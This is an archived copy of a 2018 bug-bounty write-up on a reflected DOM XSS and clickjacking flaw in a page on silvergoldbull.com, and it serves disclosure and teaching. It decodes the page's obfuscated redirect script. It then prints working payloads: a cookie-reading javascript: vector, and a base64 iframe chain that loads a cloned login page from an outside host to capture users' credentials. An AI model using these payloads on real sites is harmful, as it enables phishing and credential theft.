---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-13_reflected-dom-xss-and-clickjacking-on-httpssilvergoldbulldebthtml.md
original_filename: 2018-09-13_reflected-dom-xss-and-clickjacking-on-httpssilvergoldbulldebthtml.md
title: Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html
category: documents
detected_topics:
- xss
- command-injection
- otp
- clickjacking
tags:
- imported
- documents
- xss
- command-injection
- otp
- clickjacking
language: en
raw_sha256: dadb4cf2b41daf507a3eeb28b5ee212758c9910191cd69a43150ce9971573c6f
text_sha256: c0e3f07f0c59a12475b2badaf79cb967a9080431ac74ee7545275b53985391a2
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: true
---

# Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-13_reflected-dom-xss-and-clickjacking-on-httpssilvergoldbulldebthtml.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, clickjacking
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: True
- Raw SHA256: `dadb4cf2b41daf507a3eeb28b5ee212758c9910191cd69a43150ce9971573c6f`
- Text SHA256: `c0e3f07f0c59a12475b2badaf79cb967a9080431ac74ee7545275b53985391a2`


## Content

---
title: "Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html"
url: "https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0"
authors: ["Daniel Maksimovic"]
programs: ["Silver Gold Bull"]
bugs: ["DOM XSS", "Clickjacking"]
publication_date: "2018-09-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5703
scraped_via: "browseros"
---

# Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html

Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html
Daniel Maksimovic
Follow
5 min read
·
Sep 13, 2018

209

3

While doing spidering on silvergoldbull site I noticed a strange request to https://silvergoldbull.de/bt.html with following request:

https://silvergoldbull.com/bt.html?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdv***REDACTED-SUSPECT-TOKEN***Page redirected to:

https://silvergoldbull.com/es/us-top-picks-silver/3

Lets check what is in the source code:

var _0x2ad7 = [‘split’, ‘join’, ‘fromCharCode’, ‘length’, ‘ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/’, ‘charAt’, ‘location’, ‘search’, ‘substr’];

(function(_0x1c1079, _0x4030e6) {

var _0x37524a = function(_0x43a4b9) {

while ( — _0x43a4b9) {

_0x1c1079[‘push’](_0x1c1079[‘shift’]());

}

};

_0x37524a(++_0x4030e6);

}(_0x2ad7, 0x17c));

var _0x11bc = function(_0x4a174f, _0x2b3ed7) {

_0x4a174f = _0x4a174f — 0x0;

var _0x51adc6 = _0x2ad7[_0x4a174f];

return _0x51adc6;

};

b = function(_0x1a02a7) {

var _0x4af312 = {},

_0x2b3791, _0x1b21f9 = 0x0,

_0x45e157, _0x5eca9b, _0x241abe = 0x0,

_0x385668, _0x2ceca8 = ‘’,

_0x3299c7 = String[_0x11bc(‘0x0’)],

_0x2844f2 = _0x1a02a7[_0x11bc(‘0x1’)];

var _0x5717d2 = _0x11bc(‘0x2’);

for (_0x2b3791 = 0x0; _0x2b3791 < 0x40; _0x2b3791++) {

_0x4af312[_0x5717d2[_0x11bc(‘0x3’)](_0x2b3791)] = _0x2b3791;

}

for (_0x5eca9b = 0x0; _0x5eca9b < _0x2844f2; _0x5eca9b++) {

_0x45e157 = _0x4af312[_0x1a02a7[_0x11bc(‘0x3’)](_0x5eca9b)];

_0x1b21f9 = (_0x1b21f9 << 0x6) + _0x45e157;

_0x241abe += 0x6;

while (_0x241abe >= 0x8) {

((_0x385668 = _0x1b21f9 >>> (_0x241abe -= 0x8) & 0xff) || _0x5eca9b < _0x2844f2–0x2) && (_0x2ceca8 += _0x3299c7(_0x385668));

}

}

return _0x2ceca8;

};

var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]);

var h = p[‘get’](‘g’);

var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1);

h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1);

var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’);

var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq);

window.location = u.replace(/[‘“]+/g, ‘’);

Script takes the value from the URL and sets it as window.location in the last step. Step by step it looks like this:

var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]);

This var defines new URLSearchParams interface which takes the value of window.location.search as parameter. In this case it is the value of g parameter. So variable p has the value of:

?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdv***REDACTED-SUSPECT-TOKEN***Next:

var h = p[‘get’](‘g’);

takes the value of g parameter and assign its value to h variable. Variable h has the value of:

z8iclZHbpNXLzt2YpBXLw9GdtMXdv***REDACTED-SUSPECT-TOKEN***Next variable e is created:

var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1);

It does a substring javascript method and takes the last character of the string assigned to h variable, last value of that string is number 1 ( last value must be number, if not there will be an error since parseInt in variable eq takes string and parses it to integer, so the value must be numeric, no letters ) :

z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa[1]

Next value h is assigned the value of h without the last character, in this case it is 1. So h has the value of:

h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1);

z8iclZHbpNXLzt2YpBXLw9GdtMXd***REDACTED-SUSPECT-TOKEN***Next variable eq has the value of array with two field and join method adds the value of “=” to array.

var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’);

So the value inside array and the value variable eq is:

=

Last step is variable u, there are three things happening here. Value of h is split into array, and then reversed and joined again with value of eq variable added to the end.

var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq);

So first we get:

h.split(“”);

(68) [“z”, “8”, “i”, “c”, “l”, “Z”, “H”, “b”, “p”, “N”, “X”, “L”, “z”, “t”, “2”, “Y”, “p”, “B”, “X”, “L”, “w”, “9”, “G”, “d”, “t”, “M”, “X”, “d”, “v”, “M”, “X”, “Z”, “v”, “0”, “2”, “b”, “j”, “5”, “C”, “b”, “s”, “V”, “n”, “Y”, “k”, “x”, “2”, “b”, “n”, “J”, “X”, “Z”, “2”, “x”, “W”, “a”, “z”, “9”, “y”, “L”, “6”, “M”, “H”, “c”, “0”, “R”, “H”, “a”]

And then reverse the values:

h.split(“”).reverse();

(68) [“a”, “H”, “R”, “0”, “c”, “H”, “M”, “6”, “L”, “y”, “9”, “z”, “a”, “W”, “x”, “2”, “Z”, “X”, “J”, “n”, “b”, “2”, “x”, “k”, “Y”, “n”, “V”, “s”, “b”, “C”, “5”, “j”, “b”, “2”, “0”, “v”, “Z”, “X”, “M”, “v”, “d”, “X”, “M”, “t”, “d”, “G”, “9”, “w”, “L”, “X”, “B”, “p”, “Y”, “2”, “t”, “z”, “L”, “X”, “N”, “p”, “b”, “H”, “Z”, “l”, “c”, “i”, “8”, “z”]

And them join the values and add the value of eq variable:

h.split(“”).reverse().join(“”) + eq

“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”

So we get the final falue encoded in BASE64 and the function b does decoding to cleartext and regex inside window.location removes quotes and double quotes.

b(“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”);

“https://silvergoldbull.com/es/us-top-picks-silver/3"

Exploitation time:

1. Simple XSS as simple POC

URL:

https://silvergoldbull.com/bt.html?g=xETMv8yOpUWar***REDACTED-SUSPECT-TOKEN***POC:

Press enter or click to view image in full size
Img 1.0 Page loads in Google Chrome — XSS Auditor bypassed
Press enter or click to view image in full size
Img 2.0 Page loads in Mozilla Firefox

We used vector javascript:alert(document.cookie);//111 to generate BASE64 without equal or plus signs and then we reverse the string and add numeric value to the end:

Img 3.0 Base64 encoded XSS vector
Img 4.0 Base64 reversed XSS vector

But we can’t get the cookies we need cos of HTTPOnly on the cookies, so we need a more advanced attack. Something that will get us data.

2. Stealing user logins with fake login inside Iframe displayed on https://silvergoldbull.com

Lets first clone the login page and setup fake https login page:

https://maxon3.github.io/silvergold/

Next we have to setup out injection vector, since quotes and double quotes are removed from the vector we have to use something other instead of them, we can use backtics and bypass that. Steps:

Get Daniel Maksimovic’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

1. Set new parameter inside URL request with value of encoded base64 iframe ( secK parameter )

2. Request value of secK with our javascript injected vector ( injection vector is the value of g parameter )

3. Page gets rendered and displayed

4. User enters his data and clicks login

5. Attacker has user data and the best thing is URL will still show silvergoldbull

Vector used is:

https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi***REDACTED-SUSPECT-TOKEN***Explained:

Value of g is:

var h = “v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1”; console.log(atob(h.substr(0,h.length-1).split(“”).reverse().join(“”)));

javascript:document.write(atob(p[`get`](`secK`)));////

So we take the value of param secK and decode it with atob function, after decoding is done the value is written inside DOM and rendered.

The value of secK is:

atob(‘PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==’)

<iframe onload=”window.stop();”src=’//goo.gl/hQ4xXo’style=”height:1000px;width:100%;border:0">

We used google redirector to shorten the base64 vector, removed spaces where we could, removed the border, set iframe to take full value of viewport, and to remove loading spinning animation we set window.stop() to run right after the page has finished loading.

POC:

Press enter or click to view image in full size
Img 5.0 Page loaded on Google Chrome with fake login iframe server from github pages
Press enter or click to view image in full size
Img 6.0 After user submits the login form we got his data

All attacker needs is to share URL and wait for credentials, it is that easy.

ClickJacking can also be exploited due to fact that SAMEORIGIN requirements have been satisfied:

https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvdHpiRlI2J3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi***REDACTED-SUSPECT-TOKEN***Value of secK is :

<iframe onload=”window.stop();”src=’//goo.gl/tzbFR6'style=”height:1000px;width:100%;border:0">

POC:

Press enter or click to view image in full size
Img 7.0 https://silvergoldbull.com website inside Iframe, ready for ClickJacking

Fix:

They removed the vulnerable page, but for all of you who want to “practice” and exploit this bug while reading this post, I created a hack.me just for you:

https://hack.me/104291/dom-xss-2.html

Thanks for reading.
